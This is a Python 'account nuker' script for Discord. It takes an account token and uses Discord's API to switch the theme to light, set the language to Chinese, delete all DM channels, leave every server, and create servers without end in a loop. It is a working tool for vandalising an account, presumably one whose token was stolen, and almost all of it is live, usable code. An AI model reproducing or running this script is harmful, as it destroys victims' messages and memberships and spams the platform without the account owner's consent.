import base64
import requests,json,bs4
from colorama import init,Fore
init()



def bio(token):
    h = { "accept": "*/*",
    "authority": "discord.com",
    "method": "POST",
    "path": "/api/v9/auth/register",
    "scheme": "https",
    "origin": "discord.com",
    "referer": "discord.com/register",
    "x-debug-options": "bugReporterEnabled",
    "accept-language": "en-US,en;q=0.9",
    "connection": "keep-alive",
    "content-Type": "application/json",
    'Authorization': f'{token}',
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"}
    r = requests.patch('https://discord.com/api/v9/users/@me',headers=h,json={'bio': 'arabe'})

    
def theme(token):
    h = { "accept": "*/*",
    "authority": "discord.com",
    "method": "POST",
    "path": "/api/v9/auth/register",
    "scheme": "https",
    "origin": "discord.com",
    "referer": "discord.com/register",
    "x-debug-options": "bugReporterEnabled",
    "accept-language": "en-US,en;q=0.9",
    "connection": "keep-alive",
    "content-Type": "application/json",
    'Authorization': f'{token}',
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"}
    r = requests.patch('https://discord.com/api/v9/users/@me/settings',data='{"theme":"light"}',headers=h)
    if r.status_code == 200:
        print('Light Mode Actived')
    else:
        print('Faild to set theme to light mode')
def lang(token):
    h = { "accept": "*/*",
    "authority": "discord.com",
    "method": "POST",
    "path": "/api/v9/auth/register",
    "scheme": "https",
    "origin": "discord.com",
    "referer": "discord.com/register",
    "x-debug-options": "bugReporterEnabled",
    "accept-language": "en-US,en;q=0.9",
    "connection": "keep-alive",
    "content-Type": "application/json",
    'Authorization': f'{token}',
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"}
    r = requests.patch('https://discord.com/api/v9/users/@me/settings',data='{"locale":"zh-CN"}',headers=h)
    if r.status_code == 200:
        print('Lang Set to Chinise')
    else:
        print('Fail to Set Lang to Chinise')


def delete_dms(token):
    h = { "accept": "*/*",
    "authority": "discord.com",
    "method": "POST",
    "path": "/api/v9/auth/register",
    "scheme": "https",
    "origin": "discord.com",
    "referer": "discord.com/register",
    "x-debug-options": "bugReporterEnabled",
    "accept-language": "en-US,en;q=0.9",
    "connection": "keep-alive",
    "content-Type": "application/json",
    'Authorization': f'{token}',
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"}
    channel = requests.get('https://discord.com/api/v9/users/@me/channels',headers=h)
    if channel.status_code not in [401, 403]:
        for channel in channel.json():
            response = requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}',headers=h)
            if response.status_code == 200:
                print(f'[+]dms deleted:{channel["id"]}')

def Leave_Guild(token):
    h = { "accept": "*/*",
    "authority": "discord.com",
    "method": "POST",
    "path": "/api/v9/auth/register",
    "scheme": "https",
    "origin": "discord.com",
    "referer": "discord.com/register",
    "x-debug-options": "bugReporterEnabled",
    "accept-language": "en-US,en;q=0.9",
    "connection": "keep-alive",
    "content-Type": "application/json",
    'Authorization': f'{token}',
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"}
    Guild = requests.get('https://discord.com/api/v8/users/@me/guilds',headers=h)
    if Guild.status_code not in [401, 403]:
        for Guild in Guild.json():
            response = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{Guild["id"]}',headers=h, data='{"lurking":false}')
            if response.status_code == 204:
                print(f'[+]Guild leaved:{Guild["id"]}')

def create_serveur(token,name):
    h = { "accept": "*/*",
    "authority": "discord.com",
    "method": "POST",
    "path": "/api/v9/auth/register",
    "scheme": "https",
    "origin": "discord.com",
    "referer": "discord.com/register",
    "x-debug-options": "bugReporterEnabled",
    "accept-language": "en-US,en;q=0.9",
    "connection": "keep-alive",
    "content-Type": "application/json",
    'Authorization': f'{token}',
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"}
    payload =json.loads('{"name":"serveurname","icon":null,"channels":[],"system_channel_id":null,"guild_template_code":"2TffvPucqHkN"}')
    payload['name'] = name
    print(payload)
    while True:
        r = requests.post('https://discord.com/api/v9/guilds',headers=h,json=payload)
        if r.status_code == 201:
            print('[+]Serveur Created')



            

def main():
    print(f'''
 █████╗  ██████╗ ██████╗ ██╗   ██╗███╗   ██╗████████╗███╗   ██╗██╗   ██╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██╔════╝██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝████╗  ██║██║   ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║██║     ██║   ██║██║   ██║██╔██╗ ██║   ██║   ██╔██╗ ██║██║   ██║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██║     ██║   ██║██║   ██║██║╚██╗██║   ██║   ██║╚██╗██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║╚██████╗╚██████╔╝╚██████╔╝██║ ╚████║   ██║   ██║ ╚████║╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                {Fore.LIGHTRED_EX}Dev By DK16#0001{Fore.LIGHTBLUE_EX}
                                                                                                             '''.replace('█', f'{Fore.LIGHTBLUE_EX}█{Fore.LIGHTCYAN_EX}'))
    
    Token = input('Discord Acount Token:')
    name = input('Discord serveur name:')
    #bioo = input('bio:')
    #bio(Token)
    theme(Token)
    lang(Token)
    delete_dms(Token)
    Leave_Guild(Token)
    create_serveur(Token,name)

main()

    
    


